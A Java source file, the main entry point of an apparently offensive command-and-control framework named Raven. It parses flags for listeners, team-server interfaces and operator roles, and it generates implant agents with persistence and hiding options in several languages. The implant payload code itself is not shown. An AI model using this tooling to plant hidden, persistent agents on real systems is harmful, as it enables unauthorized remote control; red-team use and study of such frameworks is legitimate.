package com.raven;

import com.raven.core.cryptography.CertificateManager;
import com.raven.core.database.TeamDatabase;
import com.raven.core.database.TeamDatabase.OperatorRole;
import com.raven.core.output.Logger;
import com.raven.core.server.ListenerMode;
import com.raven.interfaces.APP.WebApp;
import com.raven.interfaces.CLI.CLI;
import com.raven.interfaces.GUI.GUI;
import com.raven.interfaces.TeamServer;
import com.raven.interfaces.banner.TBanner;
import com.raven.utils.AgentSourceGen;
import com.raven.utils.Helper;
import com.raven.utils.ServerConfig;
import com.raven.utils.SystemHelper;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.List;

public final class Start {

    private static ServerConfig Config;

    public static void main(String[] RawArgs) {
        Config = new ServerConfig();
        Logger.Configure(
            Config.GetLoggingLevel(), Config.IsVerbose(),
            Config.IsFileLoggingEnabled(), Config.GetLogFile(), Config.GetMaxLogEntries()
        );
        ProcessArgs(Arrays.asList(RawArgs));
    }

    private static void ProcessArgs(List<String> Args) {
        if (Has(Args, "-h", "-help"))      { Helper.PrintHelp(); return; }
        if (Has(Args, "-i", "-init"))      { ShowBanner(); InitCertificates(Arg(Args, "-s", "-host", Config.GetServerHost())); return; }
        if (Has(Args, "-l", "-list"))      { ShowBanner(); ListAgents(); return; }

        String AgentId = Arg(Args, "-a", "-agent", null);
        if (AgentId != null)               { ShowBanner(); GenerateAgent(AgentId, Args); return; }

        if (Has(Args, "-ma", "-magent"))   { ShowBanner(); GenerateMultiAgent(Args); return; }

        String RevokeId = Arg(Args, "-rv", "-revoke", null);
        if (RevokeId != null)              { ShowBanner(); RevokeAgent(RevokeId); return; }

        if (Has(Args, "-AO", "-addop"))    { ShowBanner(); HandleAddOperator(Args); return; }
        if (Has(Args, "-RO", "-rmop"))     { ShowBanner(); HandleRemoveOperator(Args); return; }
        if (Has(Args, "-OP", "-setperm"))  { ShowBanner(); HandleOperatorPermission(Args); return; }

        ShowBanner();

        String Host  = Arg(Args, "-s", "-host", Config.GetServerHost());
        int    Port  = ParseInt(Arg(Args, "-p", "-port", String.valueOf(Config.GetServerPort())), Config.GetServerPort());
        ListenerMode Mode = ResolveMode(Args);

        if (Mode.RequiresTls() && !Files.exists(Paths.get(Config.GetKeystorePath()))) {
            Logger.Error("Keystore not found: " + Config.GetKeystorePath());
            Logger.Warn("Run: java -jar raven.jar -i");
            System.exit(1);
        }

        String Interface = ResolveInterface(Args);
        Logger.Info("Mode: " + Mode.name() + " Interface: " + Interface.toUpperCase());
        StartInterface(Host, Port, Mode, Interface, Args);
    }

    private static ListenerMode ResolveMode(List<String> Args) {
        if (Has(Args, "-F", "-fmtls"))  return ListenerMode.FMTLS;
        if (Has(Args, "-T", "-mtls"))   return ListenerMode.MTLS;
        if (Has(Args, "-tls"))          return ListenerMode.TLS;
        if (Has(Args, "-https"))        return ListenerMode.HTTPS;
        if (Has(Args, "-http"))         return ListenerMode.HTTP;
        if (Has(Args, "-R", "-raw"))    return ListenerMode.RAW;
        if (Has(Args, "-M", "-multi"))  return ListenerMode.MULTI;
        return ListenerMode.FromString(Config.GetServerMode());
    }

    private static String ResolveInterface(List<String> Args) {
        if (Has(Args, "-TS",  "-teamserver"))     return "teamserver";
        if (Has(Args, "-TSC", "-teamserver-cli")) return "teamserver-cli";
        if (Has(Args, "-TSW", "-teamserver-web")) return "teamserver-web";
        if (Has(Args, "-TSG", "-teamserver-gui")) return "teamserver-gui";
        if (Has(Args, "-C",   "-cli"))            return "cli";
        if (Has(Args, "-G",   "-gui"))            return "gui";
        if (Has(Args, "-W",   "-web"))            return "web";
        return Config.GetInterfaceMode();
    }

    private static void StartInterface(String Host, int Port, ListenerMode Mode, String Interface, List<String> Args) {
        try {
            switch (Interface) {
                case "cli"            -> new CLI(Config).Run(Host, Port, Mode);
                case "gui"            -> GUI.Launch(Config);
                case "teamserver"     -> {
                    int ApiPort = ParseInt(Arg(Args, "-tp", "-tport", String.valueOf(Config.GetTeamServerPort())), Config.GetTeamServerPort());
                    int WebPort = ParseInt(Arg(Args, "-wp", "-web-port", "-1"), -1);
                    TeamServer BackendServer = new TeamServer(Config, Mode);
                    BackendServer.RunAsBackend(Config.GetWebHost(), ApiPort);
                    if (WebPort > 0) BackendServer.StartWebPanel(Config.GetWebHost(), WebPort);
                    Thread.currentThread().join();
                }
                case "teamserver-cli" -> {
                    String TeamHost = Arg(Args, "-ts", "-thost", "127.0.0.1");
                    int    TeamPort = ParseInt(Arg(Args, "-tp", "-tport", String.valueOf(Config.GetTeamServerPort())), Config.GetTeamServerPort());
                    new com.raven.interfaces.TeamClient(Config, TeamHost, TeamPort).Run();
                }
                case "teamserver-gui" -> GUI.LaunchTeam(Config);
                case "teamserver-web" -> {
                    String BackendHost = Arg(Args, "-ts", "-thost", null);
                    int    BackendPort = ParseInt(Arg(Args, "-tp", "-tport", String.valueOf(Config.GetTeamServerPort())), Config.GetTeamServerPort());
                    int    WebPort     = ParseInt(Arg(Args, "-wp", "-web-port", String.valueOf(Config.GetWebPort())), Config.GetWebPort());
                    if (BackendHost != null) {
                        new TeamServer(Config, Mode).RunWebFrontend(BackendHost, BackendPort, Config.GetWebHost(), WebPort);
                    } else {
                        new TeamServer(Config, Mode).RunStandalone(Config.GetWebHost(), BackendPort, Config.GetWebHost(), WebPort);
                    }
                    Thread.currentThread().join();
                }
                case "web" -> {
                    int WebPort = ParseInt(Arg(Args, "-wp", "-web-port", String.valueOf(Config.GetWebPort())), Config.GetWebPort());
                    new WebApp(Config, Mode).Run(Config.GetWebHost(), WebPort);
                    Thread.currentThread().join();
                }
                default -> {
                    int WebPort = ParseInt(Arg(Args, "-wp", "-web-port", String.valueOf(Config.GetWebPort())), Config.GetWebPort());
                    new WebApp(Config, Mode).Run(Config.GetWebHost(), WebPort);
                    Thread.currentThread().join();
                }
            }
        } catch (InterruptedException Ignored) {
            Logger.Warn("Server stopped");
        } catch (Exception Exception) {
            Logger.Error("Fatal: " + Exception.getMessage());
            System.exit(1);
        }
    }

    private static void ShowBanner() {
        SystemHelper.ClearScreen();
        TBanner.Logo();
    }

    private static void InitCertificates(String Host) {
        try {
            CertificateManager Manager = new CertificateManager(Config);
            Manager.Initialize(Host);
            Logger.Success("Certificates stored in: " + Paths.get(Config.GetKeystorePath()).getParent());
            Logger.Info("Next: java -jar raven.jar -a <agent-id>");
        } catch (Exception Exception) {
            Logger.Error("Certificate init failed: " + Exception.getMessage());
        }
    }

    private static void GenerateAgent(String AgentId, List<String> Args) {
        try {
            AssertCaExists();
            String  Host    = Arg(Args, "-ah", "-ahost",   Config.GetServerHost());
            int     Port    = ParseInt(Arg(Args, "-ap", "-aport", String.valueOf(Config.GetServerPort())), Config.GetServerPort());
            boolean UseMtls = Has(Args, "-am", "-amtls");
            boolean Persist = Has(Args, "-ps", "-persist");
            boolean Hide    = Has(Args, "-hc", "-hide");
            String  Lang    = Arg(Args, "-al", "-lang", "java");
            CertificateManager Manager = new CertificateManager(Config);
            Manager.Initialize(Host);
            DeployAgent(AgentId, Manager.CreateAgentCertificate(AgentId), Host, Port, UseMtls, Persist, Hide, Lang);
        } catch (Exception Exception) {
            Logger.Error("Agent generation failed: " + Exception.getMessage());
        }
    }

    private static void GenerateMultiAgent(List<String> Args) {
        int    Count  = ParseInt(Arg(Args, "-c", "-count", "10"), 10);
        String Prefix = Arg(Args, "-px", "-prefix", "agent");
        Logger.Info("Generating " + Count + " agents — prefix: " + Prefix);
        int Done = 0;
        for (int Index = 1; Index <= Count; Index++) {
            String AgentId = String.format("%s-%03d", Prefix, Index);
            try {
                GenerateAgent(AgentId, Args);
                Done++;
            } catch (Exception Exception) {
                Logger.Error("Failed " + AgentId + ": " + Exception.getMessage());
            }
        }
        Logger.Info("Generated " + Done + "/" + Count + " agents");
    }

    private static void ListAgents() {
        try {
            Path AgentDir = Paths.get(Config.GetAgentCertDir());
            if (!Files.exists(AgentDir)) {
                Logger.Warn("No agents found — generate with: -a <agent-id>");
                return;
            }
            Files.list(AgentDir)
                .filter(Entry -> Entry.toString().endsWith(".p12"))
                .forEach(Entry -> Logger.Info("Agent: " + Entry.getFileName()));
        } catch (Exception Exception) {
            Logger.Error("List agents failed: " + Exception.getMessage());
        }
    }

    private static void RevokeAgent(String AgentId) {
        try {
            new CertificateManager(Config).RevokeAgentCertificate(AgentId);
        } catch (Exception Exception) {
            Logger.Error("Revoke failed: " + Exception.getMessage());
        }
    }

    private static void DeployAgent(String AgentId, String CertPath, String Host, int Port,
                                    boolean UseMtls, boolean Persist, boolean Hide, String Lang) throws IOException {
        String OutputDir = "IMPLANT/" + AgentId.toUpperCase();
        Files.createDirectories(Paths.get(OutputDir));
        Files.copy(Paths.get(CertPath),            Paths.get(OutputDir + "/agent.p12"), StandardCopyOption.REPLACE_EXISTING);
        Files.copy(Paths.get(Config.GetCaPath()),   Paths.get(OutputDir + "/ca.p12"),   StandardCopyOption.REPLACE_EXISTING);

        String NormLang  = Lang != null && !Lang.isEmpty() ? Lang.toLowerCase() : "java";
        String SourceFile = OutputDir + "/" + AgentSourceGen.Filename(NormLang);
        Files.writeString(Paths.get(SourceFile), AgentSourceGen.Generate(NormLang, AgentId, Host, Port, UseMtls, Persist, Hide));
        if (NormLang.equals("bash") || NormLang.equals("sh")) Paths.get(SourceFile).toFile().setExecutable(true);

        try (PrintWriter Writer = new PrintWriter(OutputDir + "/README.txt")) {
            Writer.println("RAVEN Agent — " + AgentId);
            Writer.println("Server  : " + Host + ":" + Port);
            Writer.println("MTLS    : " + (UseMtls ? "ENABLED" : "DISABLED"));
            Writer.println("Persist : " + Persist);
            Writer.println("Lang    : " + NormLang.toUpperCase());
            Writer.println("Files   : agent.p12  ca.p12  " + AgentSourceGen.Filename(NormLang));
            Writer.println();
            Writer.println("-- HOW TO RUN --");
            switch (NormLang) {
                case "java"         -> { Writer.println("  javac " + AgentSourceGen.Filename(NormLang)); Writer.println("  java RavenAgent"); }
                case "python", "py" -> Writer.println("  python3 agent.py");
                case "go"           -> { Writer.println("  go build -ldflags \"-s -w\" -o agent agent.go"); Writer.println("  ./agent"); }
                case "bash", "sh"   -> Writer.println("  chmod +x agent.sh && ./agent.sh");
            }
        }

        Logger.Success("Agent generated : " + OutputDir);
        Logger.Info("  Source : " + AgentSourceGen.Filename(NormLang));
        Logger.Info("  Server : " + Host + ":" + Port + "  MTLS=" + UseMtls + "  Lang=" + NormLang.toUpperCase());
    }

    private static void HandleAddOperator(List<String> Args) {
        String Username = Arg(Args, "-u", "-user", null);
        String Password = Arg(Args, "-pw", "-pass", null);
        String Role     = Arg(Args, "-ro", "-role", "OPERATOR");
        if (Username == null || Password == null) {
            Logger.Error("Usage: -AO | -addop  -u <user>  -pw <pass>  [-ro <ROLE>]");
            return;
        }
        if (Password.length() < 8) { Logger.Error("Password must be at least 8 characters"); return; }
        TeamDatabase Database    = TeamDatabase.Connect(Config);
        OperatorRole OperatorRoleValue = OperatorRole.FromString(Role);
        if (Database.CreateOperator(Username, Password, OperatorRoleValue))
            Logger.Success("Operator created: " + Username + " [" + OperatorRoleValue + "] — " + OperatorRoleValue.PermissionString());
        else
            Logger.Error("Failed — username may already exist");
        Database.Close();
    }

    private static void HandleRemoveOperator(List<String> Args) {
        String Username = Arg(Args, "-u", "-user", null);
        if (Username == null) { Logger.Error("Usage: -RO | -rmop  -u <user>"); return; }
        if (Username.equals("admin")) { Logger.Error("Cannot remove the admin account"); return; }
        TeamDatabase Database = TeamDatabase.Connect(Config);
        if (Database.DeleteOperator(Username)) Logger.Success("Operator removed: " + Username);
        else                                   Logger.Error("Operator not found: " + Username);
        Database.Close();
    }

    private static void HandleOperatorPermission(List<String> Args) {
        String Username = Arg(Args, "-u", "-user", null);
        String Role     = Arg(Args, "-ro", "-role", null);
        if (Username == null && Role == null) {
            Logger.Info("Available roles:");
            for (OperatorRole OperatorRoleValue : OperatorRole.values())
                Logger.Info("  " + OperatorRoleValue.name() + " — " + OperatorRoleValue.PermissionString());
            return;
        }
        if (Username == null || Role == null) { Logger.Error("Usage: -OP | -setperm  -u <user>  -ro <ROLE>"); return; }
        if (Username.equals("admin"))         { Logger.Error("Cannot change the admin role"); return; }
        TeamDatabase Database          = TeamDatabase.Connect(Config);
        OperatorRole OperatorRoleValue = OperatorRole.FromString(Role);
        if (Database.UpdateOperatorRole(Username, OperatorRoleValue))
            Logger.Success("Role updated: " + Username + " → " + OperatorRoleValue + " — " + OperatorRoleValue.PermissionString());
        else
            Logger.Error("Failed to update role for: " + Username);
        Database.Close();
    }

    private static void AssertCaExists() {
        if (!Files.exists(Paths.get(Config.GetCaPath()))) {
            Logger.Error("CA not found: " + Config.GetCaPath());
            Logger.Warn("Run: java -jar raven.jar -i");
            System.exit(1);
        }
    }

    private static boolean Has(List<String> Args, String... Flags) {
        for (String Flag : Flags) if (Args.contains(Flag)) return true;
        return false;
    }

    private static String Arg(List<String> Args, String Short, String Long, String Default) {
        return Helper.Arg(Args, Short, Long, Default);
    }

    private static int ParseInt(String Value, int Default) {
        return Helper.ParseInt(Value, Default);
    }
}
